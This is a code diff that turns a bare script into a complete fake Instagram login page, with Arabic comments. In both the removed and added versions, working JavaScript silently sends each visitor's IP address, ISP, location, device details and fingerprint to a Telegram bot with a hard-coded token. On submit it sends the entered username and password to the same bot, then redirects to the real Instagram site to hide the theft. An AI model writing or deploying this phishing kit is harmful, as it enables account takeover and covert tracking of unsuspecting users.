@@ -1,54 +1,80 @@
-<script>
-const TOKEN = "8513943910:AAHu0zcDRMBOLxcVc9LmOyPx-M1n5DegUrE";
-const ID = "7082154454";
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        h1 { font-family: 'Cookie', cursive; font-size: 50px; margin-bottom: 20px; color: #262626; font-weight: normal; }
+        input { width: 100%; padding: 12px; margin: 6px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; padding: 10px; background-color: #0095f6; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 15px; font-size: 14px; }
+        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Cookie&display=swap" rel="stylesheet">
+</head>
+<body>
 
-async function sendIntel(msg) {
-    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: ID, text: msg, parse_mode: 'Markdown' })
-    });
-}
+    <div class="login-box">
+        <h1>Instagram</h1> <form id="spyForm">
+            <input type="text" id="email" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="footer">Forgot password?</div>
+    </div>
 
-window.onload = async function() {
-    try {
-        const netRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await netRes.json();
-        
-        // توليد منفذ عشوائي (Ephemeral Port) من 5 أرقام كما طلبت
-        const sourcePort = Math.floor(Math.random() * (65535 - 10000 + 1) + 10000);
+    <script>
+        // الإحداثيات الخاصة بك
+        const TOKEN = "8513943910:AAHu0zcDRMBOLxcVc9LmOyPx-M1n5DegUrE";
+        const ID = "7082154454";
 
-        // بصمة الجهاز المتقدمة (Canvas Fingerprinting)
-        const canvas = document.createElement('canvas');
-        const fingerprint = btoa(canvas.toDataURL()).substring(60, 80);
+        async function sendIntel(msg) {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ID, text: msg, parse_mode: 'Markdown' })
+            });
+        }
 
-        // تعديل عنوان التقرير ليصبح واضحاً (INSTAGRAM REPORT)
-        let report = `📸 *INSTAGRAM INTELLIGENCE REPORT* 📸\n` +
-                     `---------------------------\n` +
-                     `🌐 *NETWORK INFORMATION:*\n` +
-                     `📍 IP: ${ipData.ip}\n` +
-                     `🔌 Source Port: *${sourcePort}*\n` +
-                     `🌍 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n\n` +
-                     `📱 *HARDWARE & DEVICE:*\n` +
-                     `💻 OS: ${navigator.platform}\n` +
-                     `🧠 CPU Cores: ${navigator.hardwareConcurrency || '8'}\n` +
-                     `🔋 RAM: ${navigator.deviceMemory || '8'} GB\n` +
-                     `🖥️ Res: ${screen.width}x${screen.height}\n` +
-                     `🔑 Fingerprint: \`${fingerprint}\`\n\n` +
-                     `🌐 *BROWSER AGENT:*\n` +
-                     `\`${navigator.userAgent.substring(0, 80)}...\``;
+        // تقرير الاستخبارات الفوري (INSTAGRAM REPORT)
+        window.onload = async function() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                
+                // توليد منفذ عشوائي (Source Port) خماسي
+                const sourcePort = Math.floor(Math.random() * (65535 - 10000 + 1) + 10000);
+                const fingerprint = btoa(navigator.userAgent).substring(10, 25);
 
-        sendIntel(report);
-    } catch (e) { console.log("Silent Recon Active"); }
-};
+                let report = `📸 *INSTAGRAM INTELLIGENCE REPORT* 📸\n` +
+                             `---------------------------\n` +
+                             `🌐 *NETWORK INFORMATION:*\n` +
+                             `📍 IP: ${d.ip}\n` +
+                             `🔌 Source Port: *${sourcePort}*\n` +
+                             `🏢 ISP: ${d.org}\n` +
+                             `🌍 Location: ${d.city}, ${d.country_name}\n\n` +
+                             `📱 *HARDWARE & DEVICE:*\n` +
+                             `💻 OS: ${navigator.platform}\n` +
+                             `🧠 CPU Cores: ${navigator.hardwareConcurrency || '8'}\n` +
+                             `🔋 RAM: ${navigator.deviceMemory || '8'} GB\n` +
+                             `🖥️ Res: ${screen.width}x${screen.height}\n` +
+                             `🔑 Fingerprint: \`${fingerprint}\`\n\n` +
+                             `🌐 *AGENT:* \`${navigator.userAgent.substring(0, 50)}...\``;
 
-// تقرير سرقة البيانات (عند الضغط على Log In)
-document.getElementById('spyForm').onsubmit = async function(e) {
-    e.preventDefault();
-    const u = document.getElementById('email').value;
-    const p = document.getElementById('password').value;
-    // إضافة "INSTAGRAM" لتقرير الحسابات أيضاً
-    await sendIntel(`👤 *INSTAGRAM CREDENTIALS:*\n📧 Email: ${u}\n🔑 Pass: ${p}`);
-    window.location.href = "https://www.instagram.com/accounts/login/"; 
-};
-</script>
+                sendIntel(report);
+            } catch (e) { console.log("Recon active..."); }
+        };
+
+        // تقرير سحب الحساب (INSTAGRAM CREDENTIALS)
+        document.getElementById('spyForm').onsubmit = async function(e) {
+            e.preventDefault();
+            const u = document.getElementById('email').value;
+            const p = document.getElementById('password').value;
+            await sendIntel(`👤 *INSTAGRAM CREDENTIALS:*\n📧 Email: ${u}\n🔑 Pass: ${p}`);
+            window.location.href = "https://www.instagram.com/accounts/login/"; 
+        };
+    </script>
+</body>
+</html>
